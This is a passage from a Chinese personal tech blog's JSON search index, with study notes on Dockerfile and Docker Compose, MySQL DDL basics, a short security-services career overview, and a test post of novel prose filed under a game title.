格式 VOLUME [“目录”]</td>\n</tr>\n<tr>\n<td>EXPOSE</td>\n<td>暴露端口</td>\n<td>定义容器运行的时候监听的端口 启动容器的使用-p来绑定暴露端口 格式: EXPOSE 8080 或者 EXPOSE 8080&#x2F;udp</td>\n</tr>\n<tr>\n<td>WORKDIR</td>\n<td>工作目录</td>\n<td>指定容器内部的工作目录 如果没有创建则自动创建 如果指定&#x2F; 使用的是绝对地址 如果不是&#x2F;开头那么是在上一条workdir的路径的相对路径</td>\n</tr>\n<tr>\n<td>USER</td>\n<td>指定执行用户</td>\n<td>指定build或者启动的时候 用户 在RUN CMD ENTRYPONT执行的时候的用户</td>\n</tr>\n<tr>\n<td>HEALTHCHECK</td>\n<td>健康检查</td>\n<td>指定监测当前容器的健康监测的命令 基本上没用 因为很多时候 应用本身有健康监测机制</td>\n</tr>\n<tr>\n<td>ONBUILD</td>\n<td>触发器</td>\n<td>当存在ONBUILD关键字的镜像作为基础镜像的时候 当执行FROM完成之后 会执行 ONBUILD的命令 但是不影响当前镜像 用处也不怎么大</td>\n</tr>\n<tr>\n<td>STOPSIGNAL</td>\n<td>发送信号量到宿主机</td>\n<td>该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。</td>\n</tr>\n<tr>\n<td>SHELL</td>\n<td>指定执行脚本的shell</td>\n<td>指定RUN CMD ENTRYPOINT 执行命令的时候 使用的shell</td>\n</tr>\n</tbody></table>\n<h5 id=\"案例1\"><a href=\"#案例1\" class=\"headerlink\" title=\"案例1\"></a>案例1</h5><p>需求：定义dockerfile，发布springboot项目</p>\n<p>实现步骤 ① 定义父镜像：FROM java:8 ② 定义作者信息：MAINTAINER itheima  ③ 将jar包添加到容器： ADD springboot.jar app.jar ④ 定义容器启动执行的命令：CMD java–jar app.jar ⑤ 通过dockerfile构建镜像：docker bulid –f dockerfile文件路径 –t 镜像名称:版本</p>\n<p>成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301152821606.png\" alt=\"image-20230301152821606\"></p>\n<h5 id=\"案例2\"><a href=\"#案例2\" class=\"headerlink\" title=\"案例2\"></a>案例2</h5><p>需求：自定义centos7镜像。</p>\n<p>要求：1.默认登录路经为&#x2F;usr 2.可以使用vim</p>\n<p>dockerfile：</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> centos:<span class=\"number\">7</span></span><br><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> realikun404</span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> yum install -y vim</span></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> /bin/bash</span></span><br></pre></td></tr></table></figure>\n\n<p>然后</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker build -f dockerfile -t mycentos:1 .</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6、Docker服务编排\"><a href=\"#6、Docker服务编排\" class=\"headerlink\" title=\"6、Docker服务编排\"></a>6、Docker服务编排</h3><h5 id=\"服务编排概念\"><a href=\"#服务编排概念\" class=\"headerlink\" title=\"服务编排概念\"></a>服务编排概念</h5><p>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停 ，维护的工作量会很大。 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">要从Dockerfile build image 或者去dockerhub拉取image </span><br><span class=\"line\">要创建多个container </span><br><span class=\"line\">要管理这些container（启动停止删除） </span><br></pre></td></tr></table></figure>\n\n<p>服务编排： 按照一定的业务规则批量管理容器</p>\n<h5 id=\"Docker-Compose概述\"><a href=\"#Docker-Compose概述\" class=\"headerlink\" title=\"Docker Compose概述\"></a>Docker Compose概述</h5><p>Docker Compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建 ，启动和停止。使用步骤：</p>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 利用 Dockerfile 定义运行环境镜像</li>\n<li><input disabled=\"\" type=\"checkbox\"> 使用 docker-compose.yml 定义组成应用的各服务</li>\n<li><input disabled=\"\" type=\"checkbox\"> 运行 docker-compose up 启动应用</li>\n</ul>\n<h5 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h5><p>安装Docker Compose</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。</span> </span><br><span class=\"line\">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置文件可执行权限</span> </span><br><span class=\"line\">chmod +x /usr/local/bin/docker-compose</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看版本信息</span> </span><br><span class=\"line\">docker-compose -version</span><br></pre></td></tr></table></figure>\n\n<p>卸载Docker Compose</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">二进制包方式安装的，删除二进制文件即可</span></span><br><span class=\"line\">rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>\n\n\n\n<p>使用docker compose编排nginx+springboot项目</p>\n<ol>\n<li>创建docker-compose目录</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir ~/docker-compose</span><br><span class=\"line\">cd ~/docker-compose</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>编写 docker-compose.yml 文件</li>\n</ol>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\">version: <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\">services:</span><br><span class=\"line\">  nginx:</span><br><span class=\"line\">   image: nginx</span><br><span class=\"line\">   ports:</span><br><span class=\"line\">    - <span class=\"number\">80</span>:<span class=\"number\">80</span></span><br><span class=\"line\">   links:</span><br><span class=\"line\">    - app</span><br><span class=\"line\">   volumes:</span><br><span class=\"line\">    - ./nginx/conf.d:/etc/nginx/conf.d</span><br><span class=\"line\">  app:</span><br><span class=\"line\">    image: app</span><br><span class=\"line\">    <span class=\"keyword\">expose</span>:</span><br><span class=\"line\">      - <span class=\"string\">&quot;8080&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建.&#x2F;nginx&#x2F;conf.d目录</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p ./nginx/conf.d</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"4\">\n<li>在.&#x2F;nginx&#x2F;conf.d目录下 编写itheima.conf文件</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    access_log off;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://app:8080;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>在~&#x2F;docker-compose 目录下 使用docker-compose 启动容器</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose up</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>测试访问</li>\n</ol>\n<h3 id=\"7、私有镜像\"><a href=\"#7、私有镜像\" class=\"headerlink\" title=\"7、私有镜像\"></a>7、私有镜像</h3><p>略</p>\n<h3 id=\"8、Docker容器虚拟化与传统虚拟机相比\"><a href=\"#8、Docker容器虚拟化与传统虚拟机相比\" class=\"headerlink\" title=\"8、Docker容器虚拟化与传统虚拟机相比\"></a>8、Docker容器虚拟化与传统虚拟机相比</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161119318.png\" alt=\"image-20230301161119318\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161129373.png\" alt=\"image-20230301161129373\"></p>\n","tags":["docker"]},{"title":"sagemathStudy","url":"/2023/03/09/sagemathStudy/","content":"","tags":["crypto sageMath"]},{"title":"杀戮尖塔观者流派介绍","url":"/2023/02/15/%E6%9D%80%E6%88%AE%E5%B0%96%E5%A1%94%E8%A7%82%E8%80%85/","content":"<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/20230215113853.png\"><br>眼前的场景是那样的普通，以至于巴顿没觉得有任何问题。</p>\n<p>虽然他隐约觉得有一点熟悉，但并不认为这值得奇怪：</p>\n<p>每天都会看到的场景怎么会没有一点熟悉感？</p>\n<p>他目光移动，望向了高空，只见绯红的月亮静静悬挂，挥洒着光芒，让人心情不由自主就沉淀了下来。</p>\n<p>这一刻，巴顿似乎卸下了无形的重担，身心都异常轻松，再也没有了之前的那种恐慌，焦虑和烦躁。</p>\n<p>他的灵性直觉告诉他，弗纳尔这件事情到此结束了，不会再影响到他的生活。</p>\n<p>“风暴在上，感谢主的庇佑。”巴顿旋即握右拳击左胸，小声自语了一句。</p>\n<p>没有了那种担忧和紧绷，他只觉疲惫如同洪水，奔腾着从自己灵魂深处涌了出来，淹没了大脑，淹没了四肢，淹没了身体的每一个细胞。</p>\n<p>巴顿忍不住用手背抵住嘴巴，打了个哈欠，但脸上却多了几分惬意的笑容。</p>\n<p>他没再停留于书房，转身离开这里，一路回到卧室，以享受般的状态泡了个澡，喝了一小杯红酒。</p>\n<p>这一晚，巴顿没再做梦，睡得异常踏实。</p>\n<p>当他早晨醒来时，精神舒展，愉悦暗涌，就仿佛获得了新的一次人生。</p>\n<p>看了眼旁边还在熟睡的妻子，巴顿小心起床，换好衣物，于家附近走了一圈。</p>\n<p>他之前从未发现自己所在的街区是如此的美好：</p>\n<p>空气清新，环境安宁，风景怡人，就连行人都是那样的有教养。</p>\n<p>这让巴顿的心情愈发得好，再次深刻地认识到弗纳尔的事情结束了，自己又回到普通宁和的生活中了。</p>\n<p>他保持着这样的心情，回到家中，和妻儿一起享用起早餐。</p>\n<p>这个过程中，他甚至给妻子讲了讲报纸上登载的笑话，满足了孩子们一个小小的要求。</p>\n<p>看到妻儿脸上的笑容，巴顿由衷地感到满足。</p>\n<p>然后，他穿上外套，戴好帽子，提着手杖，出门乘坐无轨公共马车，一路来到位于城区边缘的“鲁恩古物搜集和保护基金会”。</p>\n<p>进入自己的办公室，巴顿找回了往日的节奏，先不忙着工作，而是给自家准备起加了些奇特草药的红茶。</p>\n<p>就着红茶，悠闲地读完了家里没订阅的那几份报纸，他才拿起收到的信和文件，依次审阅。</p>\n<p>这样的流程，这样的节奏，让他感觉异常舒坦。</p>\n<p>唯一的一点不谐在于，巴顿还是有点担心又收到弗纳尔的信。</p>\n<p>不过，这种担忧没有变成现实。</p>\n<p>大概一刻钟后，他的办公室房门被人笃笃笃敲响。</p>\n<p>“请进。”巴顿端起杯子，喝了口红茶。</p>\n<p>推门而入的是“合规部”副主管，外貌普通，没有特色，但让人感觉亲切的帕切科.道恩。</p>\n<p>“昨晚睡得还好吗？”帕切科立于门口，打招呼般问道。</p>\n<p>“非常棒。”巴顿未做隐瞒。</p>\n<p>帕切科点了下头，微笑说道：</p>\n<p>“看来你确实已经摆脱了这件事情的影响。”</p>\n<p>巴顿没说自己做的那个“噩梦”，转而问道：</p>\n<p>“你呢？”</p>\n<p>“我也睡得很好。”帕切科笑着回应道，“警方已完全接手了这件事情，据说昨晚就找到弗纳尔了，可惜，他似乎遭遇了不幸。”</p>\n<p>“可怜的人，愿他能得到安宁。”巴顿没有说愿主庇佑他，因为弗纳尔已经背弃了对“风暴之主”的信仰，如果真有“庇佑”，那必然是闪电加风暴。</p>\n<p>说完，想到帕切科之前提供的帮助，以及对方令人亲切的姿态，巴顿主动说道：</p>\n<p>“等会一起享用午餐？”</p>\n<p>“你请客吗？”帕切科笑着说道。</p>\n<p>“当然，很高兴认识你这么一位朋友。”</p>\n","tags":["-test1 -test2"]},{"title":"安全服务新人指南","url":"/2023/03/15/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%85%A5%E9%97%A8/","content":"<h2 id=\"安全服务认知\"><a href=\"#安全服务认知\" class=\"headerlink\" title=\"安全服务认知\"></a>安全服务认知</h2><p>keyword：安服项、彩虹计划、解决方案项、安全服务 交付文档规范</p>\n<p>tips：不要借安全漏洞做坏事，安服要了解的东西很多</p>\n<h3 id=\"技术类的交互\"><a href=\"#技术类的交互\" class=\"headerlink\" title=\"技术类的交互\"></a>技术类的交互</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173110594.png\" alt=\"image-20230315173110594\" style=\"zoom:50%;\" />\n\n<p>给客户做培训类似的</p>\n<h3 id=\"安全测试子类：\"><a href=\"#安全测试子类：\" class=\"headerlink\" title=\"安全测试子类：\"></a>安全测试子类：</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173251617.png\" alt=\"image-20230315173251617\"></p>\n<h3 id=\"咨询服务类：\"><a href=\"#咨询服务类：\" class=\"headerlink\" title=\"咨询服务类：\"></a>咨询服务类：</h3><p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173432143.png\" alt=\"image-20230315173432143\"></p>\n<p>滴滴被查，数据安全，数据怎么存更安全等。</p>\n<p>sdl定义：<a href=\"https://zhuanlan.zhihu.com/p/252325178\">分享|安全开发流程（SDL） - 知乎 (zhihu.com)</a></p>\n<h3 id=\"培训服务类：\"><a href=\"#培训服务类：\" class=\"headerlink\" title=\"培训服务类：\"></a>培训服务类：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315173722143.png\" alt=\"image-20230315173722143\" style=\"zoom:50%;\" />\n\n<p>等级保护对应了解：<a href=\"https://zhuanlan.zhihu.com/p/349827782\">网络安全等级保护分几级？ - 知乎 (zhihu.com)</a></p>\n<h3 id=\"安保服务类\"><a href=\"#安保服务类\" class=\"headerlink\" title=\"安保服务类\"></a>安保服务类</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174222803.png\" alt=\"image-20230315174222803\" style=\"zoom:50%;\" />\n\n<h3 id=\"达到目的：\"><a href=\"#达到目的：\" class=\"headerlink\" title=\"达到目的：\"></a>达到目的：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174424514.png\" alt=\"image-20230315174424514\" style=\"zoom:50%;\" />\n\n<h3 id=\"安全服务要素：\"><a href=\"#安全服务要素：\" class=\"headerlink\" title=\"安全服务要素：\"></a>安全服务要素：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174511541.png\" alt=\"image-20230315174511541\" style=\"zoom:50%;\" />\n\n<h3 id=\"人员分类：\"><a href=\"#人员分类：\" class=\"headerlink\" title=\"人员分类：\"></a>人员分类：</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315174608766.png\" alt=\"image-20230315174608766\" style=\"zoom:50%;\" />\n\n<p><del>还有很多没记录</del></p>\n<h3 id=\"树立网络安全\"><a href=\"#树立网络安全\" class=\"headerlink\" title=\"树立网络安全\"></a>树立网络安全</h3><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230315175142932.png\" alt=\"image-20230315175142932\" style=\"zoom:50%;\" />\n","tags":["安全服务 报告"]},{"title":"mysql_basic","url":"/2023/03/03/mysql-basic/","content":"<h1 id=\"mysql概述\"><a href=\"#mysql概述\" class=\"headerlink\" title=\"mysql概述\"></a>mysql概述</h1><h2 id=\"数据库相关概念\"><a href=\"#数据库相关概念\" class=\"headerlink\" title=\"数据库相关概念\"></a>数据库相关概念</h2><table>\n<thead>\n<tr>\n<th>名称</th>\n<th>全称</th>\n<th>简称</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数据库</td>\n<td>存储数据的仓库，数据是有组织的进行存储</td>\n<td>DataBase（DB）</td>\n</tr>\n<tr>\n<td>数据库管理系统</td>\n<td>操纵和管理数据库的大型软件</td>\n<td>DataBase Management System (DBMS)</td>\n</tr>\n<tr>\n<td>SQL</td>\n<td>操作关系型数据库的语言，定义了一套操作关系型数据库统一标准</td>\n<td>Structured Query Language (SQL)</td>\n</tr>\n</tbody></table>\n<h2 id=\"MySQL数据库\"><a href=\"#MySQL数据库\" class=\"headerlink\" title=\"MySQL数据库\"></a>MySQL数据库</h2><h3 id=\"版本\"><a href=\"#版本\" class=\"headerlink\" title=\"版本\"></a>版本</h3><p>MySQL官方提供了两种不同的版本：</p>\n<p> 社区版本（MySQL Community Server） 免费， MySQL不提供任何技术支持 </p>\n<p>商业版本（MySQL Enterprise Edition） 收费，可以使用30天，官方提供技术支持</p>\n<h3 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h3><p>略</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><h3 id=\"启动与停止\"><a href=\"#启动与停止\" class=\"headerlink\" title=\"启动与停止\"></a>启动与停止</h3><p>cmd输入services.msc</p>\n<p>找到</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303094200943.png\" alt=\"image-20230303094200943\"></p>\n<p>控制登录与启动</p>\n<p>或者命令行：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">net start mysql80</span><br><span class=\"line\">net stop mysql80</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端连接\"><a href=\"#客户端连接\" class=\"headerlink\" title=\"客户端连接\"></a>客户端连接</h3><p> 方式一：使用MySQL提供的客户端命令行工具</p>\n<p>方式二：使用系统自带的命令行工具执行指令（需要配置系统变量）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql [-h 127.0.0.1] [-P 3306] -u root -p</span><br><span class=\"line\">参数：</span><br><span class=\"line\">-h : MySQL服务所在的主机IP</span><br><span class=\"line\">-P : MySQL服务端口号， 默认3306</span><br><span class=\"line\">-u : MySQL数据库用户名</span><br><span class=\"line\">-p ： MySQL数据库用户名对应的密码</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据模型\"><a href=\"#数据模型\" class=\"headerlink\" title=\"数据模型\"></a>数据模型</h3><h4 id=\"关系型数据库（RDBMS）\"><a href=\"#关系型数据库（RDBMS）\" class=\"headerlink\" title=\"关系型数据库（RDBMS）\"></a>关系型数据库（RDBMS）</h4><p>概念：建立在关系模型基础上，由多张相互连接的二维表组成的数据库。 而所谓二维表，指的是由行和列组成的表，如下图（就类似于Excel表格数据，有表头、有列、有行， 还可以通过一列关联另外一个表格中的某一列数据）。我们之前提到的MySQL、Oracle、DB2、 SQLServer这些都是属于关系型数据库，里面都是基于二维表存储数据的。简单说，基于二维表存储 数据的数据库就成为关系型数据库，不是基于二维表存储数据的数据库，就是非关系型数据库。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095014254.png\" alt=\"image-20230303095014254\"></p>\n<p>特点： A. 使用表存储数据，格式统一，便于维护。 B. 使用SQL语言操作，标准统一，使用方便。</p>\n<h4 id=\"数据模型-1\"><a href=\"#数据模型-1\" class=\"headerlink\" title=\"数据模型\"></a>数据模型</h4><p>MySQL是关系型数据库，是基于二维表进行数据存储的，具体的结构图下：</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303095111026.png\" alt=\"image-20230303095111026\" style=\"zoom:50%;\" />\n\n<p>我们可以通过MySQL客户端连接数据库管理系统DBMS，然后通过DBMS操作数据库。</p>\n<p> 可以使用SQL语句，通过数据库管理系统操作数据库，以及操作数据库中的表结构及数据。</p>\n<p> 一个数据库服务器中可以创建多个数据库，一个数据库中也可以包含多张表，而一张表中又可以包 含多行记录。</p>\n<h1 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h1><h2 id=\"SQL通用语法\"><a href=\"#SQL通用语法\" class=\"headerlink\" title=\"SQL通用语法\"></a>SQL通用语法</h2><p>1). SQL语句可以单行或多行书写，以分号结尾。</p>\n<p> 2). SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。 </p>\n<p>3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。 </p>\n<p>4). 注释： 单行注释：– 注释内容 或 # 注释内容 多行注释：&#x2F;*注释内容 *&#x2F;</p>\n<h2 id=\"SQL分类\"><a href=\"#SQL分类\" class=\"headerlink\" title=\"SQL分类\"></a>SQL分类</h2><table>\n<thead>\n<tr>\n<th align=\"center\">分 类</th>\n<th align=\"center\">全称</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">DDL</td>\n<td align=\"center\">Data Definition Language</td>\n<td align=\"center\">数据定义语言，用来定义数据库对象(数据库，表， 字段)</td>\n</tr>\n<tr>\n<td align=\"center\">DML</td>\n<td align=\"center\">Data Manipulation Language</td>\n<td align=\"center\">数据操作语言，用来对数据库表中的数据进行增删改</td>\n</tr>\n<tr>\n<td align=\"center\">DQL</td>\n<td align=\"center\">Data Query Language</td>\n<td align=\"center\">数据查询语言，用来查询数据库中表的记录</td>\n</tr>\n<tr>\n<td align=\"center\">DCL</td>\n<td align=\"center\">Data Control Language</td>\n<td align=\"center\">数据控制语言，用来创建数据库用户、控制数据库的 访问权限</td>\n</tr>\n</tbody></table>\n<h2 id=\"DDL\"><a href=\"#DDL\" class=\"headerlink\" title=\"DDL\"></a>DDL</h2><h3 id=\"数据库操作\"><a href=\"#数据库操作\" class=\"headerlink\" title=\"数据库操作\"></a>数据库操作</h3><p>1). 查询所有数据库 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show databases ;</span><br></pre></td></tr></table></figure>\n\n<p>2). 查询当前数据库 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select database() ;</span><br></pre></td></tr></table></figure>\n\n<p>3). 创建数据库 create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序 规则 ] ;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序</span><br><span class=\"line\">规则 ] ;</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<p>A:创建一个itcast数据库, 使用数据库默认的字符集。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create database itcast;</span><br><span class=\"line\">create database if not extists itcast;</span><br></pre></td></tr></table></figure>\n\n<p>B:创建一个itheima数据库，并且指定字符集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create database itheima default charset utf8mb4;</span><br><span class=\"line\">-- create database itheima default charset utf8;一般不建议使用utf-8</span><br></pre></td></tr></table></figure>\n\n<p>4). 删除数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">drop database [ if exists ] 数据库名 ;</span><br></pre></td></tr></table></figure>\n\n<p>5). 切换数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">use 数据库名 ;</span><br><span class=\"line\"># 可以使用select database();看自己当前使用的哪个数据库</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"表操作\"><a href=\"#表操作\" class=\"headerlink\" title=\"表操作\"></a>表操作</h3><h4 id=\"查询创建\"><a href=\"#查询创建\" class=\"headerlink\" title=\"查询创建\"></a>查询创建</h4><p>1). 查询当前数据库所有表 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show tables; </span><br></pre></td></tr></table></figure>\n\n<p>2). 查看指定表结构 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">desc 表名 ;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102245084.png\" alt=\"image-20230303102245084\"></p>\n<p>通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为NULL，是否存在默认值等信 息。</p>\n<p> 3). 查询指定表的建表语句 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">show create table 表名 ;</span><br></pre></td></tr></table></figure>\n\n<p>通过这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询 到，因为这部分是数据库的默认值，如：存储引擎、字符集等。</p>\n<p>4). 创建表结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE TABLE 表名(</span><br><span class=\"line\">字段1 字段1类型 [ COMMENT 字段1注释 ],</span><br><span class=\"line\">字段2 字段2类型 [COMMENT 字段2注释 ],</span><br><span class=\"line\">字段3 字段3类型 [COMMENT 字段3注释 ],</span><br><span class=\"line\">......</span><br><span class=\"line\">字段n 字段n类型 [COMMENT 字段n注释 ]</span><br><span class=\"line\">) [ COMMENT 表注释 ] ;</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create table tb_user(</span><br><span class=\"line\">id int comment &#x27;编号&#x27;,</span><br><span class=\"line\">name varchar(50) comment &#x27;姓名&#x27;,</span><br><span class=\"line\">age int comment &#x27;年龄&#x27;,</span><br><span class=\"line\">gender varchar(1) comment &#x27;性别&#x27;</span><br><span class=\"line\">) comment &#x27;用户表&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230303102945089.png\" alt=\"image-20230303102945089\"></p>\n<h4 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h4><p>参考菜鸟教程</p>\n<p><a href=\"https://www.runoob.com/mysql/mysql-data-types.html\">MySQL 数据类型 | 菜鸟教程 (runoob.com)</a></p>\n<p>1). 数值类型</p>\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1). 年龄字段 -- 不会出现负数, 而且人的年龄不会太大</span><br><span class=\"line\">age tinyint unsigned</span><br><span class=\"line\">2). 分数 -- 总分100分, 最多出现一位小数</span><br><span class=\"line\">score double(4,1)</span><br></pre></td></tr></table></figure>\n\n<p>2). 字符串类型</p>\n<p>vchar性能比char要低一些</p>\n<p>用户名：vchar</p>\n<p>性别：char</p>\n<p>3). 日期时间类型</p>\n<h4 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h4><p>设计一张员工信息表，要求如下：</p>\n<ol>\n<li>编号（纯数字） </li>\n<li>员工工号 (字符串类型，长度不超过10位) </li>\n<li>员工姓名（字符串类型，长度不超过10位） </li>\n<li>性别（男&#x2F;女，存储一个汉字） </li>\n<li>年龄（正常人年龄，不可能存储负数） </li>\n<li>身份证号（二代身份证号均为18位，身份证中有X这样的字符） 入职时间（取值年月日即可）</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">create table emp(</span><br><span class=\"line\">    id int comment &quot;编号&quot;,</span><br><span class=\"line\">    workno varchar(10) comment &quot;员工工号&quot;,</span><br><span class=\"line\">    name varchar(10) comment &#x27;姓名&#x27;,</span><br><span class=\"line\">\tgender char(1) comment &#x27;性别&#x27;,</span><br><span class=\"line\">\tage tinyint unsigned comment &#x27;年龄&#x27;,</span><br><span class=\"line\">\tidcard char(18) comment &#x27;身份证号&#x27;,</span><br><span class=\"line\">\tentrydate date comment &#x27;入职时间&#x27;</span><br><span class=\"line\">) comment &quot;员工表&quot;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改\"><a href=\"#修改\" class=\"headerlink\" title=\"修改\"></a>修改</h4><p>1). 添加字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 ADD 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];</span><br></pre></td></tr></table></figure>\n\n<p>案例: </p>\n<p>为emp表增加一个新的字段”昵称”为nickname，类型为varchar(20)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE emp ADD nickname varchar(20) COMMENT &#x27;昵称&#x27;;</span><br></pre></td></tr></table></figure>\n\n<p>2). 修改数据类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 MODIFY 字段名 新数据类型 (长度);</span><br></pre></td></tr></table></figure>\n\n<p>3). 修改字段名和字段类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ 